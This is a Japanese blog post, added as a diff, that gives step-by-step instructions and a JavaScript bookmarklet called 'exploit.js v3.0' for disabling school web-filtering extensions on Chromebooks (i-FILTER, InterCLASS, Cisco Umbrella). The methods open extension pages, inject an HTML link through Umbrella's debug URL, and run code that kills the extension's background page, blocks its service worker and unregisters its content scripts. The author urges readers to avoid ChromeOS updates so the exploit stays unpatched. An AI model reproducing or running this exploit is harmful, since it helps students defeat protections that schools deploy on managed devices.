@@ -1,0 +1,193 @@
+{
+  "date": "2023-02-26T22:16:50",
+  "draft": false,
+  "params": {
+    "author": 3
+  },
+  "title": "[公開済み, Chromebook] ブロック解除方法 / exploit.js v3.0",
+  "summary": "公開済み",
+  "url": "/chromebook/2688/",
+  "tags": "chromebook,ブロック回避,blockunlock,chrome,chromebook,回避",
+  "categories": [
+    "chromebook",
+    "ブロック回避",
+    "ブロック解除"
+  ]
+}
+
+<p>localです。<br>最後のBlogBooksでの仕事です。</p>
+
+
+
+<p class="is-style-nishiki-blocks-pro-paragraph-warning-01">ChromeOS のアップデートをおすすめしません。(再起動も含め)<br>&gt; 対策される可能性があるため</p>
+
+
+
+<p></p>
+
+
+
+<p>先に言います、これまで(2022/07 ~ 2023/3の8ヶ月間)ありがとうございました。<br>僕は来年から高校生です。あとは、あとの人たちに任せます。<br>(BlogBooksの所有者二人が居なくなるということで、BlogBooks閉鎖疑惑浮上してますが&#8230;)</p>
+
+
+
+<p class="is-style-nishiki-blocks-pro-paragraph-info-02">&#8211; Twitter: <a rel="noreferrer noopener" href="https://twitter.com/ChromingPro" target="_blank">ChromePro(@chromingpro)</a><br>&#8211; Discord Server: <a rel="noreferrer noopener" href="https://www.blogbooks.net/shortlinks/discord/bbs-community" target="_blank">BlogBooks Community</a></p>
+
+
+
+<h2 class="wp-block-heading">ガイドブック</h2>
+
+
+
+<div class="wp-block-nishiki-blocks-pro-tabs is-text-hidden has-margin has-title-border has-content-border" id="nishiki-blocks-pro-tabs-fba01374-ef37-48ee-8e9a-ce93f5e8919d"><div class="tab-titles" role="tab-titles"><button class="tab tab-1 active" role="tab" aria-selected="true" aria-controls="tab-content-1" tabindex="0"><span class="text">使い方</span></button><button class="tab tab-2" role="tab" aria-selected="false" aria-controls="tab-content-2" tabindex="-1"><span class="text">i-FILTER@Cloud Agent</span></button><button class="tab tab-3" role="tab" aria-selected="false" aria-controls="tab-content-3" tabindex="-1"><span class="text">InterCLASS Filtering Service</span></button><button class="tab tab-4" role="tab" aria-selected="false" aria-controls="tab-content-4" tabindex="-1"><span class="text">Cisco Umbrella</span></button></div><div class="tab-contents">
+<div class="tab-content tab-content-1 active" tabindex="0" role="tab-content">
+<p>上のタブから、自分のフィルタリングを選択して、それぞれのブロック解除方法を見てください</p>
+
+
+
+<p class="is-style-nishiki-blocks-pro-paragraph-info-01">フィルタリング開発者(対策側)に見てほしくないですね〜</p>
+</div>
+
+
+
+<div class="tab-content tab-content-2" tabindex="0" role="tab-content" hidden>
+<h3 class="wp-block-heading">i-FILTER@Cloud Agent</h3>
+
+
+
+<ol class="wp-block-list">
+<li>chrome-extension://bkfmfndedcalgdgaklieojjfbbjpmijd/options.html を開く</li>
+
+
+
+<li>「ブロックテスト」ボタンを押してすぐEscキー(左上)を押す</li>
+</ol>
+
+
+
+<figure class="wp-block-video"><video controls src="/wp-content/uploads/2023/03/Screen-recording-2023-03-07-22.16.14.webm"></video></figure>
+
+
+
+<ol class="wp-block-list" start="3">
+<li>そうすると、無題というタイトル状態になるので、下のコードをコピーして実行(最初にjavascript:と入力してください。そうしないと、Google検索になってしまいます)</li>
+</ol>
+
+
+
+<pre class="wp-block-code"><code>if (opener &amp;&amp; opener.location.protocol == "chrome-extension:" &amp;&amp; opener.chrome.extension) {console.debug("Created By BlogBooks Developers");console.debug("Started &#91;exploit.js v3.0]\n| Licence: https://oncreative.space/project/blogbooks/exploit.js/LICENCE\n| Version: 3.0\n| Author: BlogBooks Developers\n| Copyright: (c) 2020-2023 BlogBooks Community &amp; Developers");document.write("&lt;h2&gt;&#91;exploit.js v3.0]&lt;/h2&gt;&lt;br&gt;| Licence: &lt;a href='https://oncreative.space/project/blogbooks/exploit.js/LICENCE' target='_blank' rel='licence'&gt;https://oncreative.space/project/blogbooks/exploit.js/LICENCE&lt;/a&gt;&lt;br&gt;| Version: 3.0&lt;br&gt;| Author: BlogBooks Developers&lt;br&gt;| Copyright: (c) 2020-2023 BlogBooks Community &amp; Developers&lt;hr&gt;");console.warn("Use \"Strict Mode\"");"use strict";function log(text) {document.write(`&lt;div style="color: green"&gt;${text}&lt;/div&gt;`)}try {console.debug("Checking target");console.debug(`target: \n| Extension Name: ${opener.chrome.runtime.getManifest().name}\n| Extension ID: ${opener.chrome.runtime.id}`);if (opener.chrome.runtime.getManifest().background.service_worker) {console.debug(`Found!\n Service Worker - Path: ${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`);const permissions = opener.chrome.runtime.getManifest().permissions;if (permissions.some(permission =&gt; permission == "webRequest")) {opener.chrome.webRequest.onBeforeRequest.addListener(null, {urls: &#91;`${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`]}, &#91;"blocking"]);log(`OK! Service Worker was Ejected: ${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`);} if (permissions.some(permission =&gt; permission == "scripting")) {if (opener.chrome.scripting.getRegisteredContentScripts().then(db =&gt; db.length &gt;= 1)) {opener.chrome.scripting.getRegisteredContentScripts().then(db =&gt; {const ids = &#91;];db.forEach(d =&gt; ids.push(d.id));opener.chrome.scripting.unregisterContentScripts({"ids": ids});}).then(() =&gt; log("OK! ContentScripts was Cleaned.")).catch(e =&gt; new Error(`Error: ${e.message}`));}}} else if (opener.chrome.runtime.getManifest().background.scripts) {if (opener.chrome.extension.getBackgroundPage()){opener.chrome.extension.getBackgroundPage().close();log(`OK! ${opener.chrome.runtime.getManifest().name} was killed.`);} else {throw new Error("Error: 202 Couldn't Find extension background page");}} else {throw new Error("Error: 201 Unknown Case");}} catch(e) {console.error(e);document.write(`&lt;div style="color: red"&gt;${e}&lt;/div&gt;`);}} else {document.write("&lt;div style=\"color: red\"&gt;Error: 101 Couldn't Control Window&lt;/div&gt;");}</code></pre>
+
+
+
+<figure class="wp-block-video"><video controls src="/wp-content/uploads/2023/03/Screen-recording-2023-03-08-22.10.35.webm"></video></figure>
+</div>
+
+
+
+<div class="tab-content tab-content-3" tabindex="0" role="tab-content" hidden>
+<h3 class="wp-block-heading">InterCLASS Filtering Service</h3>
+
+
+
+<ol class="wp-block-list">
+<li>chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html を開きます</li>
+</ol>
+
+
+
+<figure class="wp-block-image size-large"><img width="1024" height="543" data-attachment-id="2743" data-permalink="https://blogbooks.net/chromebook/2688/attachment/image-10-7/" data-orig-file="/wp-content/uploads/2023/03/image-10.png" data-orig-size="1366,725" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-10" data-image-description="" data-image-caption="" data-medium-file="/wp-content/uploads/2023/03/image-10-300x159.png" data-large-file="/wp-content/uploads/2023/03/image-10-1024x543.png" tabindex="0" role="button" decoding="async" src="/wp-content/uploads/2023/03/image-10-1024x543.png" alt="" class="wp-image-2743" srcset="/wp-content/uploads/2023/03/image-10-1024x543.png 1024w, /wp-content/uploads/2023/03/image-10-300x159.png 300w, /wp-content/uploads/2023/03/image-10-768x408.png 768w, /wp-content/uploads/2023/03/image-10.png 1366w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<ol class="wp-block-list" start="2">
+<li>1で開いたタブで、chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html?mode=servererror&amp;retryurl=about:blank を開く</li>
+</ol>
+
+
+
+<figure class="wp-block-video"><video controls src="/wp-content/uploads/2023/03/Screen-recording-2023-03-08-17.39.11.webm"></video></figure>
+
+
+
+<ol class="wp-block-list" start="3">
+<li>再読み込みを押して、下のbookmarkletを実行</li>
+</ol>
+
+
+
+<pre class="wp-block-code"><code>javascript:window.open("about:blank", "_blank")</code></pre>
+
+
+
+<figure class="wp-block-video"><video controls src="/wp-content/uploads/2023/03/Screen-recording-2023-03-08-17.50.02.webm"></video></figure>
+
+
+
+<p>4. 元のタブに戻り、バックボタン(戻る)を押す</p>
+
+
+
+<figure class="wp-block-video"><video controls src="/wp-content/uploads/2023/03/Screen-recording-2023-03-08-17.53.36.webm"></video></figure>
+
+
+
+<p>5. さっき、bookmarkletで開いたタブに移動し、下のbookmarkletを実行(最初にjavascript:と入力してください。そうしないと、Google検索になってしまいます)</p>
+
+
+
+<pre class="wp-block-code"><code>if (opener &amp;&amp; opener.location.protocol == "chrome-extension:" &amp;&amp; opener.chrome.extension) {console.debug("Created By BlogBooks Developers");console.debug("Started &#91;exploit.js v3.0]\n| Licence: https://oncreative.space/project/blogbooks/exploit.js/LICENCE\n| Version: 3.0\n| Author: BlogBooks Developers\n| Copyright: (c) 2020-2023 BlogBooks Community &amp; Developers");document.write("&lt;h2&gt;&#91;exploit.js v3.0]&lt;/h2&gt;&lt;br&gt;| Licence: &lt;a href='https://oncreative.space/project/blogbooks/exploit.js/LICENCE' target='_blank' rel='licence'&gt;https://oncreative.space/project/blogbooks/exploit.js/LICENCE&lt;/a&gt;&lt;br&gt;| Version: 3.0&lt;br&gt;| Author: BlogBooks Developers&lt;br&gt;| Copyright: (c) 2020-2023 BlogBooks Community &amp; Developers&lt;hr&gt;");console.warn("Use \"Strict Mode\"");"use strict";function log(text) {document.write(`&lt;div style="color: green"&gt;${text}&lt;/div&gt;`)}try {console.debug("Checking target");console.debug(`target: \n| Extension Name: ${opener.chrome.runtime.getManifest().name}\n| Extension ID: ${opener.chrome.runtime.id}`);if (opener.chrome.runtime.getManifest().background.service_worker) {console.debug(`Found!\n Service Worker - Path: ${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`);const permissions = opener.chrome.runtime.getManifest().permissions;if (permissions.some(permission =&gt; permission == "webRequest")) {opener.chrome.webRequest.onBeforeRequest.addListener(null, {urls: &#91;`${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`]}, &#91;"blocking"]);log(`OK! Service Worker was Ejected: ${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`);} if (permissions.some(permission =&gt; permission == "scripting")) {if (opener.chrome.scripting.getRegisteredContentScripts().then(db =&gt; db.length &gt;= 1)) {opener.chrome.scripting.getRegisteredContentScripts().then(db =&gt; {const ids = &#91;];db.forEach(d =&gt; ids.push(d.id));opener.chrome.scripting.unregisterContentScripts({"ids": ids});}).then(() =&gt; log("OK! ContentScripts was Cleaned.")).catch(e =&gt; new Error(`Error: ${e.message}`));}}} else if (opener.chrome.runtime.getManifest().background.scripts) {if (opener.chrome.extension.getBackgroundPage()){opener.chrome.extension.getBackgroundPage().close();log(`OK! ${opener.chrome.runtime.getManifest().name} was killed.`);} else {throw new Error("Error: 202 Couldn't Find extension background page");}} else {throw new Error("Error: 201 Unknown Case");}} catch(e) {console.error(e);document.write(`&lt;div style="color: red"&gt;${e}&lt;/div&gt;`);}} else {document.write("&lt;div style=\"color: red\"&gt;Error: 101 Couldn't Control Window&lt;/div&gt;");}</code></pre>
+
+
+
+<figure class="wp-block-video"><video controls src="/wp-content/uploads/2023/03/Screen-recording-2023-03-09-13.53.29.webm"></video></figure>
+</div>
+
+
+
+<div class="tab-content tab-content-4" tabindex="0" role="tab-content" hidden>
+<h3 class="wp-block-heading">Cisco Umbrella</h3>
+
+
+
+<ol class="wp-block-list">
+<li>下のリンクを開く</li>
+</ol>
+
+
+
+<pre class="wp-block-code"><code>chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/debug.html?os=%3Ca%20href%3D%22about:blank%22%20target%3D%22_blank%22%20rel%3D%22opener%22%3Eabout:blank%3Ca%3E</code></pre>
+
+
+
+<p>2. about:blankというリンクを押す</p>
+
+
+
+<figure class="wp-block-video"><video controls src="/wp-content/uploads/2023/03/Screen-recording-2023-03-10-21.52.19.webm"></video></figure>
+
+
+
+<p>3. 下のbookmarkletを実行(最初にjavascript:と入力してください。そうしないと、Google検索になってしまいます)</p>
+
+
+
+<pre class="wp-block-code"><code>if (opener &amp;&amp; opener.location.protocol == "chrome-extension:" &amp;&amp; opener.chrome.extension) {console.debug("Created By BlogBooks Developers");console.debug("Started &#91;exploit.js v3.0]\n| Licence: https://oncreative.space/project/blogbooks/exploit.js/LICENCE\n| Version: 3.0\n| Author: BlogBooks Developers\n| Copyright: (c) 2020-2023 BlogBooks Community &amp; Developers");document.write("&lt;h2&gt;&#91;exploit.js v3.0]&lt;/h2&gt;&lt;br&gt;| Licence: &lt;a href='https://oncreative.space/project/blogbooks/exploit.js/LICENCE' target='_blank' rel='licence'&gt;https://oncreative.space/project/blogbooks/exploit.js/LICENCE&lt;/a&gt;&lt;br&gt;| Version: 3.0&lt;br&gt;| Author: BlogBooks Developers&lt;br&gt;| Copyright: (c) 2020-2023 BlogBooks Community &amp; Developers&lt;hr&gt;");console.warn("Use \"Strict Mode\"");"use strict";function log(text) {document.write(`&lt;div style="color: green"&gt;${text}&lt;/div&gt;`)}try {console.debug("Checking target");console.debug(`target: \n| Extension Name: ${opener.chrome.runtime.getManifest().name}\n| Extension ID: ${opener.chrome.runtime.id}`);if (opener.chrome.runtime.getManifest().background.service_worker) {console.debug(`Found!\n Service Worker - Path: ${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`);const permissions = opener.chrome.runtime.getManifest().permissions;if (permissions.some(permission =&gt; permission == "webRequest")) {opener.chrome.webRequest.onBeforeRequest.addListener(null, {urls: &#91;`${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`]}, &#91;"blocking"]);log(`OK! Service Worker was Ejected: ${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`);} if (permissions.some(permission =&gt; permission == "scripting")) {if (opener.chrome.scripting.getRegisteredContentScripts().then(db =&gt; db.length &gt;= 1)) {opener.chrome.scripting.getRegisteredContentScripts().then(db =&gt; {const ids = &#91;];db.forEach(d =&gt; ids.push(d.id));opener.chrome.scripting.unregisterContentScripts({"ids": ids});}).then(() =&gt; log("OK! ContentScripts was Cleaned.")).catch(e =&gt; new Error(`Error: ${e.message}`));}}} else if (opener.chrome.runtime.getManifest().background.scripts) {if (opener.chrome.extension.getBackgroundPage()){opener.chrome.extension.getBackgroundPage().close();log(`OK! ${opener.chrome.runtime.getManifest().name} was killed.`);} else {throw new Error("Error: 202 Couldn't Find extension background page");}} else {throw new Error("Error: 201 Unknown Case");}} catch(e) {console.error(e);document.write(`&lt;div style="color: red"&gt;${e}&lt;/div&gt;`);}} else {document.write("&lt;div style=\"color: red\"&gt;Error: 101 Couldn't Control Window&lt;/div&gt;");}</code></pre>
+
+
+
+<figure class="wp-block-video"><video controls src="/wp-content/uploads/2023/03/Screen-recording-2023-03-10-21.58.30.webm"></video></figure>
+</div>
+
+
+
+<div class="tab-content tab-content-5" tabindex="0" role="tab-content" hidden>
+<ol class="wp-block-list">
+<li>下のリンクを開く</li>
+</ol>
+
+
+
+<pre class="wp-block-code"><code>chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/debug.html?os=%3Ca%20href%3D%22about:blank%22%20target%3D%22_blank%22%20rel%3D%22opener%22%3Eabout:blank%3Ca%3E</code></pre>
+</div>
+</div></div>
+元記事: <a href="https://blogbooks.net/chromebook/2688/">https://blogbooks.net/chromebook/2688/</a>
